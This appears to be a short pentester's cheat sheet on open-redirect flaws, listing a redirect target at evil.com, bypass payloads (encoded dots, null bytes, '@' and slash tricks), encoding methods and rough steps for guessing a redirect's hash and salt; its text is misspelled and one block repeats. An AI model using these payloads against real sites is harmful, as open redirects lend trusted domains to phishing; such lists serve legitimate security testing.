### Open-Redriction


Target Url: http://www.hackerscreed.com/redrict.php?url=http://evil.com



__Normal Redirects__
```
http://victim.com/http://google.com
http://victim.com/folder/www.google.com
```

-Encode "." many Layers
```
Eg: //google%E3%80%82com 
```
__Using Null Char__
```
//google%00.com
```
__Using @__
```
http://www.theirsite.com@yoursite.com/		
```

__Normal Redirects__
```
http://victim.com/http://google.com
http://victim.com/folder/www.google.com
```


### Encoding Techniques

- Url Encoded
- Double Url Encoded
- Hex Encoded
- Mixed Encoded
- base64 encoded







__Breaking the Has Mechanism__

letus Assume The website is adding the hases with the url for the redriction eg:

http://www.hackerscreed.com/redrict.php?url=http://website.com&hash=1a3s4d8a4s6d21sad84sa6
and if the hasd and the url mismatches the request is rejected ! Fallow The steps to Defeat this 
mechanism.


- nmap Server
- figure out the platform used (php,asp)
- Ask google for "built in hasing algorithms in php v5"
- Ask google for "built in hasing libraries in php"
- Now compare the results and check which hasing algorithm is used !



__Defeating The Salted Hashes__

```
This time We have to find the salt which is added at the beginning or at the end of the hash
its a little bit difficut task.
```

__Common Places to find Open Redriction__

- login
- register
- logout
- change site language
- links in emails



#### Payload List
```

//www.google.com
//google.com
../google.com
https:google.com/
\/\/google.com/
```
